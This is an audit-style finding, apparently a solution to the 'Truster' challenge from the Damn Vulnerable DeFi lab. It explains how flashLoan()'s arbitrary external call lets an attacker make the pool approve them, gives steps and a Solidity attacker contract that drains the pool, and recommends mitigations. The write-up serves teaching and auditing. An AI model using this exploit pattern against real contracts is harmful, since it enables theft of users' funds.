### [H-1] Arbitrary external call in flashLoan() allows attacker to drain pool via token approval

**Description:** In `TrusterLenderPool`, the `flashLoan()` function executes an 
arbitrary external call using `target.functionCall(data)` with no restrictions on 
what `target` or `data` can be. The call is executed in the context of the pool 
itself — meaning the pool can be made to call any function on any contract as itself, 
including approving an attacker to spend its token balance.

**Impact:** An attacker can trick the pool into approving their address for the 
pool's entire token balance, then transfer all tokens out in a single transaction — 
completely draining the pool without borrowing any tokens.

**Proof of Concept:**
1. Call `flashLoan()` with `amount = 0` — bypassing any need to repay.
2. Pass `target = address(token)` and `data = token.approve(attacker, totalSupply)`.
3. Pool executes the approval as itself — attacker is now approved for full balance.
4. Call `token.transferFrom(pool, recovery, totalSupply)` — pool is empty.

<details>
<summary>Example Code Snippet</summary>

```solidity
contract TrusterAttacker {
    function attack(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery,
        uint256 amount
    ) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, amount);
    }
}

function test_truster() public checkSolvedByPlayer {
    TrusterAttacker attacker = new TrusterAttacker();
    attacker.attack(pool, token, recovery, TOKENS_IN_POOL);
}
```
</details>

**Recommended Mitigation:**
1. Remove the arbitrary external call entirely — flash loan contracts should 
   not execute caller-supplied calldata.
2. If callbacks are needed, restrict `target` to a whitelist of trusted contracts 
   and validate `data` against known function selectors.
3. Follow the standard ERC3156 flash loan pattern — use `onFlashLoan()` callback 
   on the borrower instead of arbitrary `target.functionCall(data)`.